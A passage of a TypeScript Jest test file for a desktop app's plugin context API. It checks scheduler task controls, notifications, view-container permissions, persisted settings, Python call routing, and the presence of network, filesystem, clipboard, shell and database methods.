          triggerSource: "schedule",
          terminalReason: "execution-timeout",
          result: { success: false, error: "timed out" },
          logs: [{ level: "warn", message: "slow page", data: { page: 4 } }],
        })
        expect(skip.status).toBe("skipped")
        expect(skip.result).toBeUndefined()
        // A run with no slot reports its start.
        expect(skip.scheduledAt).toEqual(skip.startedAt)
      })

      it("computes statistics for an owned task", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(
          pluginTask({
            runCount: 5,
            successCount: 3,
            failureCount: 1,
            consecutiveFailures: 1,
            lastError: "boom",
            lastRunAt: new Date("2026-07-16T01:00:00Z"),
            nextRunAt: new Date("2026-07-16T02:00:00Z"),
          })
        )
        mockSchedulerDb.getTaskExecutions.mockResolvedValue([
          execution({ status: "completed", duration: 100 }),
          execution({ status: "failed", duration: 300 }),
          execution({ status: "skipped", duration: 0 }),
        ])
        await expect(api().getStatistics("plugin-task-1")).resolves.toEqual({
          runCount: 5,
          successCount: 3,
          failureCount: 1,
          successRate: 0.75,
          averageDurationMs: 200,
          consecutiveFailures: 1,
          lastRunAt: new Date("2026-07-16T01:00:00Z"),
          nextRunAt: new Date("2026-07-16T02:00:00Z"),
          lastError: "boom",
        })
      })

      it("has no success rate or average before anything settled", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
        await expect(api().getStatistics("plugin-task-1")).resolves.toMatchObject({
          successRate: null,
          averageDurationMs: null,
          lastRunAt: null,
          nextRunAt: null,
          lastError: null,
        })
      })
    })

    describe("updateTask", () => {
      it("maps the new execution options and trigger without resetting what it omits", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
        engine.updateTask.mockResolvedValue(pluginTask())

        await api().updateTask("plugin-task-1", {
          trigger: { type: "cron", expression: "*/5 * * * *" },
          jitterSeconds: 2,
          maxRuns: 4,
          endAt: null,
        })

        expect(engine.updateTask).toHaveBeenCalledWith("plugin-task-1", {
          trigger: { type: "cron", cronExpression: "*/5 * * * *", jitterMs: 2_000 },
          payload: expect.objectContaining({ startImmediately: false }),
          config: { maxRuns: 4 },
          endAt: null,
        })
      })

      it("jitters against the stored trigger type when the trigger is not replaced", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(
          pluginTask({ trigger: { type: "event", eventType: "x" } })
        )
        await expect(api().updateTask("plugin-task-1", { jitterSeconds: 3 })).rejects.toThrow(
          /jitterSeconds only applies/
        )
        expect(engine.updateTask).not.toHaveBeenCalled()
      })
    })

    it("pauses owned tasks through the engine so the timing driver is disarmed", async () => {
      mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
      engine.pauseTask.mockResolvedValue(true)

      await expect(api().pauseTask("plugin-task-1")).resolves.toBe(true)

      expect(engine.pauseTask).toHaveBeenCalledWith("plugin-task-1")
    })

    it("resumes and deletes owned tasks through the engine", async () => {
      mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
      engine.resumeTask.mockResolvedValue(true)
      engine.deleteTask.mockResolvedValue(true)
      const scheduler = api()

      await expect(scheduler.resumeTask("plugin-task-1")).resolves.toBe(true)
      await expect(scheduler.deleteTask("plugin-task-1")).resolves.toBe(true)
      expect(engine.deleteTask).toHaveBeenCalledWith("plugin-task-1")
    })

    describe("runTaskNow", () => {
      it("returns the engine's real execution id as soon as the run starts, with args merged", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(
          pluginTask({ payload: { pluginId: "test-plugin", handler: "h", args: { a: 1, b: 1 } } })
        )
        let settle: (row: TaskExecution) => void = () => undefined
        engine.runTaskNow.mockImplementation(
          (_id: string, opts: { onAccepted?: (row: TaskExecution) => void }) => {
            opts.onAccepted?.(execution({ id: "real-exec", status: "running" }))
            return new Promise((resolve) => {
              settle = resolve
            })
          }
        )

        await expect(api().runTaskNow("plugin-task-1", { b: 2 })).resolves.toBe("real-exec")
        expect(engine.runTaskNow).toHaveBeenCalledWith("plugin-task-1", {
          triggerSource: "run-now",
          payload: { args: { a: 1, b: 2 } },
          onAccepted: expect.any(Function),
        })
        // No hand-made row: the engine writes the only one.
        expect(mockSchedulerDb.createExecution).not.toHaveBeenCalled()
        settle(execution({ id: "real-exec" }))
      })

      it("returns the id of a start the overlap policy skipped or buffered", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
        engine.runTaskNow.mockResolvedValue(execution({ id: "skipped-exec", status: "skipped" }))
        await expect(api().runTaskNow("plugin-task-1")).resolves.toBe("skipped-exec")
        expect(engine.runTaskNow.mock.calls[0][1]).not.toHaveProperty("payload")
      })

      it("throws a descriptive error when the engine no longer has the task", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
        engine.runTaskNow.mockResolvedValue(null)
        await expect(api().runTaskNow("plugin-task-1")).rejects.toThrow(/could not be started/)
      })

      it("rejects non-object args", async () => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
        await expect(api().runTaskNow("plugin-task-1", [] as never)).rejects.toThrow(/args/)
      })
    })

    describe("cancelExecution", () => {
      beforeEach(() => {
        mockSchedulerDb.getTask.mockResolvedValue(pluginTask())
      })

      it("cancels through the engine's real cancel path", async () => {
        mockSchedulerDb.getExecution.mockResolvedValue(execution({ status: "running" }))
        engine.cancelExecution.mockResolvedValue({ cancelled: true })
        await expect(api().cancelExecution("exec-1")).resolves.toBe(true)
        expect(engine.cancelExecution).toHaveBeenCalledWith("exec-1")
        // No hand-written "cancelled" over a run that was still going.
        expect(mockSchedulerDb.updateExecution).not.toHaveBeenCalled()
      })

      it("counts a request handed to the owning context as cancelled", async () => {
        mockSchedulerDb.getExecution.mockResolvedValue(execution({ status: "running" }))
        engine.cancelExecution.mockResolvedValue({ cancelled: false, reason: "requested" })
        await expect(api().cancelExecution("exec-1")).resolves.toBe(true)
      })

      it("falls back to the plugin executor for a run only it still holds", async () => {
        mockSchedulerDb.getExecution.mockResolvedValue(execution({ status: "running" }))
        engine.cancelExecution.mockResolvedValue({ cancelled: false, reason: "not-owned-here" })
        mockIsPluginTaskExecutionActive.mockReturnValueOnce(true)
        mockCancelPluginTaskExecution.mockReturnValueOnce(true)
        await expect(api().cancelExecution("exec-1")).resolves.toBe(true)
        expect(mockCancelPluginTaskExecution).toHaveBeenCalledWith("exec-1")
      })

      it("answers false for a run nobody can reach", async () => {
        mockSchedulerDb.getExecution.mockResolvedValue(execution({ status: "running" }))
        engine.cancelExecution.mockResolvedValue({ cancelled: false, reason: "not-owned-here" })
        mockIsPluginTaskExecutionActive.mockReturnValueOnce(false)
        await expect(api().cancelExecution("exec-1")).resolves.toBe(false)
      })

      it("does not touch a settled run", async () => {
        mockSchedulerDb.getExecution.mockResolvedValue(execution({ status: "completed" }))
        await expect(api().cancelExecution("exec-1")).resolves.toBe(false)
        expect(engine.cancelExecution).not.toHaveBeenCalled()
      })

      it("reaches a buffered start, whose owner is read from the engine's queue", async () => {
        engine.getQueuedStartTaskId.mockReturnValue("plugin-task-1")
        engine.cancelExecution.mockResolvedValue({ cancelled: true })
        await expect(api().cancelExecution("queued")).resolves.toBe(true)
        expect(engine.cancelExecution).toHaveBeenCalledWith("queued")
      })
    })

    describe("emitEvent", () => {
      it("fires only this plugin's own event tasks and returns the count", async () => {
        engine.fireEventTasks.mockResolvedValue(2)
        await expect(api().emitEvent(" sync:done ", { n: 1 })).resolves.toBe(2)

        const [type, source, payload, options] = engine.fireEventTasks.mock.calls[0]
        expect([type, source, payload]).toEqual(["sync:done", "plugin:test-plugin", { n: 1 }])
        const filter = (options as { filter: (task: ScheduledTask) => boolean }).filter
        expect(filter(pluginTask())).toBe(true)
        expect(filter(pluginTask({ payload: { pluginId: "another-plugin", handler: "h" } }))).toBe(
          false
        )
        // The user's own event task is never fired from here.
        expect(filter(pluginTask({ type: "chat" }))).toBe(false)
      })

      it("rejects an empty event type and a non-object payload", async () => {
        await expect(api().emitEvent("")).rejects.toThrow(/eventType/)
        await expect(api().emitEvent("x", "nope" as never)).rejects.toThrow(/payload/)
        expect(engine.fireEventTasks).not.toHaveBeenCalled()
      })
    })

    describe("onExecution", () => {
      const flush = async () => {
        for (let index = 0; index < 5; index += 1) await Promise.resolve()
      }

      it("delivers this plugin's executions only, with their phase", async () => {
        const events: unknown[] = []
        const dispose = api().onExecution((event) => events.push(event))
        await flush()
        expect(mockSubscribeToTaskExecutions).toHaveBeenCalledTimes(1)
        const publish = mockSubscribeToTaskExecutions.mock.calls[0][0]

        publish({ task: pluginTask(), execution: execution({ status: "running" }) })
        publish({ task: pluginTask(), execution: execution({ status: "failed", error: "x" }) })
        publish({
          task: pluginTask({ payload: { pluginId: "another-plugin", handler: "h" } }),
          execution: execution({ status: "running" }),
        })
        publish({ task: pluginTask({ type: "chat" }), execution: execution() })
        publish({ task: pluginTask(), execution: execution({ status: "pending" }) })

        expect(events).toEqual([
          expect.objectContaining({
            phase: "started",
            taskId: "plugin-task-1",
            handler: "heartbeat",
            execution: expect.objectContaining({ status: "running" }),
          }),
          expect.objectContaining({ phase: "failed" }),
        ])

        dispose()
        expect(mockUnsubscribeExecutions).toHaveBeenCalledTimes(1)
      })

      it("never subscribes when disposed before the engine loaded", async () => {
        const dispose = api().onExecution(() => undefined)
        dispose()
        await flush()
        expect(mockSubscribeToTaskExecutions).not.toHaveBeenCalled()
      })

      it("is removed with the plugin's lifecycle scope", async () => {
        const scope = new PluginDisposableScope("test-plugin")
        const manager = {
          ...mockManager,
          getPluginDisposableScope: () => scope,
        } as unknown as PluginManager
        const context = createFullPluginContext(schedulerPlugin(), manager)
        context.scheduler.onExecution(() => undefined)
        await flush()
        expect(mockSubscribeToTaskExecutions).toHaveBeenCalledTimes(1)

        await scope.dispose()
        expect(mockUnsubscribeExecutions).toHaveBeenCalledTimes(1)
      })
    })

    describe("previewTrigger", () => {
      it("projects cron and interval fire times in order", async () => {
        const cron = await api().previewTrigger({ type: "cron", expression: "0 9 * * *" }, 3)
        expect(cron).toHaveLength(3)
        expect(cron[1].getTime() - cron[0].getTime()).toBe(24 * 60 * 60 * 1000)

        const before = Date.now()
        const interval = await api().previewTrigger({ type: "interval", seconds: 60 }, 2)
        expect(interval[0].getTime()).toBeGreaterThanOrEqual(before + 60_000)
        expect(interval[1].getTime() - interval[0].getTime()).toBe(60_000)
      })

      it("starts with now for a startImmediately interval", async () => {
        const before = Date.now()
        const runs = await api().previewTrigger(
          { type: "interval", seconds: 60, startImmediately: true },
          3
        )
        expect(runs).toHaveLength(3)
        expect(runs[0].getTime() - before).toBeLessThan(1000)
        expect(runs[1].getTime() - runs[0].getTime()).toBe(60_000)
      })

      it("has nothing to project for an event trigger", async () => {
        await expect(api().previewTrigger({ type: "event", eventType: "x" })).resolves.toEqual([])
      })

      it("rejects an invalid cron with the validator's message, and a bad count", async () => {
        await expect(
          api().previewTrigger({ type: "cron", expression: "not a cron" })
        ).rejects.toThrow(/cron/i)
        await expect(api().previewTrigger({ type: "interval", seconds: 60 }, 0)).rejects.toThrow(
          /count/
        )
        await expect(api().previewTrigger({ type: "interval", seconds: 60 }, 101)).rejects.toThrow(
          /at most 100/
        )
      })
    })
  })

  it("should create context with plugin path", () => {
    const plugin = createMockPlugin()
    const context = createPluginContext(plugin, mockManager)

    expect(context.pluginPath).toBe("/plugins/test-plugin")
  })

  it("should create context with config", () => {
    const config = { setting1: "value1", setting2: 42 }
    const plugin = createMockPlugin({ config })
    const context = createPluginContext(plugin, mockManager)

    expect(context.config).toEqual(config)
  })

  describe("logger", () => {
    it("should have debug method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.logger.debug).toBe("function")
    })

    it("should have info method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.logger.info).toBe("function")
    })

    it("should have warn method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.logger.warn).toBe("function")
    })

    it("should have error method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.logger.error).toBe("function")
    })

    it("should log with plugin prefix", () => {
      const consoleSpy = jest.spyOn(console, "info").mockImplementation()
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      context.logger.info("Test message")

      expect(consoleSpy).toHaveBeenCalled()

      consoleSpy.mockRestore()
    })
  })

  describe("storage", () => {
    it("should have get method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.storage.get).toBe("function")
    })

    it("should have set method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.storage.set).toBe("function")
    })

    it("should have delete method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.storage.delete).toBe("function")
    })

    it("should have keys method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.storage.keys).toBe("function")
    })

    it("should have clear method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.storage.clear).toBe("function")
    })
  })

  describe("events", () => {
    it("should have on method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.events.on).toBe("function")
    })

    it("should have off method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.events.off).toBe("function")
    })

    it("should have emit method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.events.emit).toBe("function")
    })

    it("should have once method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.events.once).toBe("function")
    })

    it("should return unsubscribe function from on", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      const unsubscribe = context.events.on("test-event", () => {})
      expect(typeof unsubscribe).toBe("function")
    })
  })

  describe("ui", () => {
    it("should have showNotification method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.ui.showNotification).toBe("function")
    })

    it("should have showToast method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.ui.showToast).toBe("function")
    })

    it("should have showDialog method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.ui.showDialog).toBe("function")
    })

    it("should map legacy message notifications onto the native body payload", async () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      const invokeMock = invoke as jest.Mock

      await context.ui.showNotification({
        title: "Reminder",
        message: "Workspace SDK linked",
        type: "success",
      })

      expect(invokeMock).toHaveBeenCalledWith("plugin_show_notification", {
        args: {
          title: "Reminder",
          body: "Workspace SDK linked",
          icon: undefined,
        },
      })
    })

    it("should nest the notification payload under the args parameter name", async () => {
      // `plugin_show_notification(app, args: ShowNotificationArgs)` takes one
      // struct parameter; Tauri resolves it by parameter name. A flat payload
      // leaves `args` absent, so the required `title` fails to deserialize and
      // the notification never fires — silently, because the call site catches.
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      const invokeMock = invoke as jest.Mock

      await context.ui.showNotification({ title: "Build finished", body: "3 plugins loaded" })

      const lastCall = invokeMock.mock.calls[invokeMock.mock.calls.length - 1]
      expect(lastCall[0]).toBe("plugin_show_notification")
      // The whole point: `args` is the only top-level key. A flat payload would
      // also satisfy a loose `objectContaining` check, so assert the keys.
      expect(Object.keys(lastCall[1])).toEqual(["args"])
      expect(lastCall[1].args).toEqual({
        title: "Build finished",
        body: "3 plugins loaded",
        icon: undefined,
      })
    })

    it("should route showNotification failures through recordSilentFailure", async () => {
      const { recordSilentFailure } = jest.requireMock("../contracts/diagnostics-store") as {
        recordSilentFailure: jest.Mock
      }
      recordSilentFailure.mockClear()

      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      const invokeMock = invoke as jest.Mock
      invokeMock.mockRejectedValueOnce(new Error("backend missing"))

      await context.ui.showNotification({ title: "x" })

      expect(recordSilentFailure).toHaveBeenCalledWith(
        plugin.manifest.id,
        expect.objectContaining({
          site: "ui.showNotification",
          message: "Failed to show notification",
        }),
        expect.any(Error)
      )
    })

    it("routes showToast to the matching sonner variant", () => {
      const { toast } = jest.requireMock("sonner") as {
        toast: { success: jest.Mock; error: jest.Mock; warning: jest.Mock; info: jest.Mock }
      }
      const context = createPluginContext(createMockPlugin(), mockManager)

      context.ui.showToast("done", "success")
      context.ui.showToast("boom", "error")
      context.ui.showToast("careful", "warning")
      context.ui.showToast("fyi")

      expect(toast.success).toHaveBeenCalledWith("done")
      expect(toast.error).toHaveBeenCalledWith("boom")
      expect(toast.warning).toHaveBeenCalledWith("careful")
      expect(toast.info).toHaveBeenCalledWith("fyi")
    })

    it("showConfirmDialog pushes a modal entry and resolves when settled", async () => {
      usePluginModalStore.getState().closeAll()

      const context = createPluginContext(createMockPlugin(), mockManager)
      const pending = context.ui.showConfirmDialog({ title: "t", message: "m" })

      const entries = usePluginModalStore.getState().stack
      expect(entries).toHaveLength(1)
      const settle = (entries[0].args as { settle: (v: boolean) => void }).settle
      settle(true)

      await expect(pending).resolves.toBe(true)
    })

    describe("openViewContainer", () => {
      beforeEach(() => {
        resetPermissionGuard()
        __resetViewContainersForTesting()
        useUIStore.getState().setSelectedGuild({ kind: "dm" })
      })
      afterEach(() => __resetViewContainersForTesting())

      it("opens the plugin's own panel container through the governed full context", async () => {
        getPermissionGuard().registerPlugin("test-plugin", ["extension:ui"])
        registerViewContainer(
          { id: "report", title: "Report", location: "panel" },
          { pluginId: "test-plugin" }
        )
        const context = createFullPluginContext(createMockPlugin(), mockManager)

        await context.ui.openViewContainer("report")

        expect(useUIStore.getState().selectedGuild).toEqual({
          kind: "plugin-view",
          containerId: "test-plugin:report",
        })
      })

      it("rejects without extension:ui and leaves the shell alone", async () => {
        getPermissionGuard().registerPlugin("test-plugin", [])
        registerViewContainer({ id: "report", title: "Report" }, { pluginId: "test-plugin" })
        const context = createPluginContext(createMockPlugin(), mockManager)

        await expect(context.ui.openViewContainer("report")).rejects.toBeInstanceOf(PermissionError)
        expect(useUIStore.getState().selectedGuild).toEqual({ kind: "dm" })
      })

      it("rejects another plugin's container", async () => {
        getPermissionGuard().registerPlugin("test-plugin", ["extension:ui"])
        registerViewContainer({ id: "x", title: "X" }, { pluginId: "other-plugin" })
        const context = createPluginContext(createMockPlugin(), mockManager)

        await expect(context.ui.openViewContainer("other-plugin:x")).rejects.toMatchObject({
          code: "foreign",
        })
      })
    })
  })

  describe("a2ui", () => {
    it("should have createSurface method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.a2ui.createSurface).toBe("function")
    })

    it("should have deleteSurface method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.a2ui.deleteSurface).toBe("function")
    })

    it("should have updateComponents method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.a2ui.updateComponents).toBe("function")
    })

    it("should have registerComponent method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.a2ui.registerComponent).toBe("function")
    })

    it("marks a surface renderable through the protocol's own surfaceReady message", () => {
      // Without this a plugin could push a complete component tree and still
      // only ever render a spinner: surfaces are created `ready: false` and
      // nothing else in the plugin API flips it.
      a2uiStoreState.processMessage.mockClear()
      const context = createPluginContext(createMockPlugin(), mockManager)

      context.a2ui.createSurface("wiki:doc-1", "panel")
      context.a2ui.updateComponents("wiki:doc-1", [
        { id: "root", component: "Markdown", content: "# Hi" },
      ] as never)
      context.a2ui.setReady("wiki:doc-1")

      expect(a2uiStoreState.createSurface).toHaveBeenCalledWith("wiki:doc-1", "panel", undefined)
      expect(a2uiStoreState.processMessage.mock.calls.map(([message]) => message)).toEqual([
        {
          type: "updateComponents",
          surfaceId: "wiki:doc-1",
          components: [{ id: "root", component: "Markdown", content: "# Hi" }],
        },
        { type: "surfaceReady", surfaceId: "wiki:doc-1" },
      ])
    })
  })

  describe("agent", () => {
    it("should have registerTool method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.agent.registerTool).toBe("function")
    })

    it("should have unregisterTool method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.agent.unregisterTool).toBe("function")
    })

    it("should have registerMode method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.agent.registerMode).toBe("function")
    })

    it("should have unregisterMode method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(typeof context.agent.unregisterMode).toBe("function")
    })
  })

  describe("settings", () => {
    beforeEach(() => {
      localStorage.clear()
    })

    it("should have get / set / onChange methods", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      expect(typeof context.settings.get).toBe("function")
      expect(typeof context.settings.set).toBe("function")
      expect(typeof context.settings.onChange).toBe("function")
    })

    it("round-trips a set value through get", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      context.settings.set("theme", "dark")
      expect(context.settings.get<string>("theme")).toBe("dark")
    })

    it("persists across a fresh context instance (reload simulation)", () => {
      const first = createPluginContext(createMockPlugin(), mockManager)
      first.settings.set("count", 7)
      // A new context (e.g. after reload) must read the persisted value.
      const second = createPluginContext(createMockPlugin(), mockManager)
      expect(second.settings.get<number>("count")).toBe(7)
    })

    it("returns undefined for an unknown key", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      expect(context.settings.get("missing")).toBeUndefined()
    })

    it("fires onChange listeners on a real write", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      const handler = jest.fn()
      context.settings.onChange("lang", handler)
      context.settings.set("lang", "zh-CN")
      expect(handler).toHaveBeenCalledWith("zh-CN")
    })

    it("stops firing after the onChange disposer runs", () => {
      const context = createPluginContext(createMockPlugin(), mockManager)
      const handler = jest.fn()
      const dispose = context.settings.onChange("lang", handler)
      dispose()
      context.settings.set("lang", "en")
      expect(handler).not.toHaveBeenCalled()
    })

    it("isolates settings between two plugin ids", () => {
      const a = createPluginContext(createMockPlugin(), mockManager)
      const bPlugin = createMockPlugin({
        manifest: { ...mockManifest, id: "other-plugin" },
      })
      const b = createPluginContext(bPlugin, mockManager)
      a.settings.set("shared", "from-a")
      expect(b.settings.get("shared")).toBeUndefined()
    })

    it("tolerates corrupt persisted JSON (get returns undefined)", () => {
      localStorage.setItem("cognia-plugin-settings:test-plugin", "{not json")
      const context = createPluginContext(createMockPlugin(), mockManager)
      expect(context.settings.get("anything")).toBeUndefined()
    })
  })

  describe("python api", () => {
    it("should not have python api for frontend plugins", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)
      expect(context.python).toBeUndefined()
    })

    it("should have python api for hybrid plugins", () => {
      const hybridManifest = { ...mockManifest, type: "hybrid" as const }
      const plugin = createMockPlugin({ manifest: hybridManifest })
      const context = createPluginContext(plugin, mockManager)
      expect(context.python).toBeDefined()
      expect(typeof context.python?.call).toBe("function")
      expect(typeof context.python?.eval).toBe("function")
    })

    it("should have python api for python plugins", () => {
      const pythonManifest = { ...mockManifest, type: "python" as const }
      const plugin = createMockPlugin({ manifest: pythonManifest })
      const context = createPluginContext(plugin, mockManager)
      expect(context.python).toBeDefined()
    })

    it("routes every python operation through the generation-aware manager", async () => {
      const plugin = createMockPlugin({
        manifest: { ...mockManifest, type: "python" as const },
      })
      const context = createPluginContext(plugin, mockManager)
      const manager = mockManager as unknown as {
        callPythonFunction: jest.Mock
        evalPython: jest.Mock
        importPythonModule: jest.Mock
        callPythonModule: jest.Mock
        getPythonModuleAttribute: jest.Mock
      }
      manager.callPythonFunction.mockResolvedValueOnce(3)
      manager.evalPython.mockResolvedValueOnce(4)
      manager.importPythonModule.mockResolvedValueOnce(undefined)
      manager.callPythonModule.mockResolvedValueOnce(5)
      manager.getPythonModuleAttribute.mockResolvedValueOnce("value")

      await expect(context.python!.call("sum", 1, 2)).resolves.toBe(3)
      await expect(context.python!.eval("x + 1", { x: 3 })).resolves.toBe(4)
      const pythonModule = await context.python!.import("demo")
      await expect(pythonModule.call("run", 5)).resolves.toBe(5)
      await expect(pythonModule.getattr("name")).resolves.toBe("value")

      expect(manager.callPythonFunction).toHaveBeenCalledWith(plugin.manifest.id, "sum", [1, 2])
      expect(manager.evalPython).toHaveBeenCalledWith(plugin.manifest.id, "x + 1", { x: 3 })
      expect(manager.importPythonModule).toHaveBeenCalledWith(plugin.manifest.id, "demo")
      expect(manager.callPythonModule).toHaveBeenCalledWith(plugin.manifest.id, "demo", "run", [5])
      expect(manager.getPythonModuleAttribute).toHaveBeenCalledWith(
        plugin.manifest.id,
        "demo",
        "name"
      )
    })

    it("routes python.import failures through recordSilentFailure (ADR 0016 T1)", async () => {
      const { recordSilentFailure } = jest.requireMock("../contracts/diagnostics-store") as {
        recordSilentFailure: jest.Mock
      }
      recordSilentFailure.mockClear()

      const hybridManifest = { ...mockManifest, type: "hybrid" as const }
      const plugin = createMockPlugin({ manifest: hybridManifest })
      const context = createPluginContext(plugin, mockManager)
      const importPythonModule = mockManager.importPythonModule as jest.Mock
      importPythonModule.mockRejectedValueOnce(new Error("python runtime missing"))

      await expect(context.python!.import("os")).rejects.toThrow("python runtime missing")

      expect(recordSilentFailure).toHaveBeenCalledWith(
        plugin.manifest.id,
        expect.objectContaining({
          site: "python.import",
          message: expect.stringContaining("os"),
        }),
        expect.any(Error)
      )
      const ctxArg = recordSilentFailure.mock.calls[0][1] as { expected: boolean }
      expect(ctxArg.expected).toBe(false)
    })
  })

  describe("network api", () => {
    it("should have all HTTP methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.network.get).toBe("function")
      expect(typeof context.network.post).toBe("function")
      expect(typeof context.network.put).toBe("function")
      expect(typeof context.network.delete).toBe("function")
      expect(typeof context.network.patch).toBe("function")
      expect(typeof context.network.fetch).toBe("function")
    })

    it("should have download and upload methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.network.download).toBe("function")
      expect(typeof context.network.upload).toBe("function")
    })
  })

  describe("filesystem api", () => {
    it("should have read methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.fs.readText).toBe("function")
      expect(typeof context.fs.readBinary).toBe("function")
      expect(typeof context.fs.readJson).toBe("function")
      expect(typeof context.fs.readDir).toBe("function")
    })

    it("should have write methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.fs.writeText).toBe("function")
      expect(typeof context.fs.writeBinary).toBe("function")
      expect(typeof context.fs.writeJson).toBe("function")
      expect(typeof context.fs.appendText).toBe("function")
    })

    it("should have file operation methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.fs.exists).toBe("function")
      expect(typeof context.fs.mkdir).toBe("function")
      expect(typeof context.fs.remove).toBe("function")
      expect(typeof context.fs.copy).toBe("function")
      expect(typeof context.fs.move).toBe("function")
      expect(typeof context.fs.stat).toBe("function")
      expect(typeof context.fs.watch).toBe("function")
    })

    it("should have directory getters", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.fs.getDataDir).toBe("function")
      expect(typeof context.fs.getCacheDir).toBe("function")
      expect(typeof context.fs.getTempDir).toBe("function")

      expect(context.fs.getDataDir()).toContain("test-plugin")
      expect(context.fs.getCacheDir()).toContain("test-plugin")
    })
  })

  describe("clipboard api", () => {
    it("should have text methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.clipboard.readText).toBe("function")
      expect(typeof context.clipboard.writeText).toBe("function")
      expect(typeof context.clipboard.hasText).toBe("function")
    })

    it("should have image methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.clipboard.readImage).toBe("function")
      expect(typeof context.clipboard.writeImage).toBe("function")
      expect(typeof context.clipboard.hasImage).toBe("function")
    })

    it("should have clear method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.clipboard.clear).toBe("function")
    })
  })

  describe("shell api", () => {
    it("should have execute method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.shell.execute).toBe("function")
    })

    it("should have spawn method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.shell.spawn).toBe("function")
    })

    it("should have open methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.shell.open).toBe("function")
      expect(typeof context.shell.showInFolder).toBe("function")
    })

    it("spawn() throws instead of returning a fake pid-0 ChildProcess", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      // The shell/process domain has no host backend (NOT_SUPPORTED). The old
      // implementation swallowed the rejection and handed back a hollow
      // ChildProcess (pid:0, empty streams) — silent garbage. It must fail loud.
      expect(() => context.shell.spawn("ls", ["-la"])).toThrow(/not supported/i)
    })
  })

  describe("database api", () => {
    it("should have query methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.db.query).toBe("function")
      expect(typeof context.db.execute).toBe("function")
    })

    it("should have transaction method", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.db.transaction).toBe("function")
    })

    it("should have table methods", () => {
      const plugin = createMockPlugin()
      const context = createPluginContext(plugin, mockManager)

      expect(typeof context.db.createTable).toBe("function")
      expect(typeof context.db.dropTable).toBe("function")
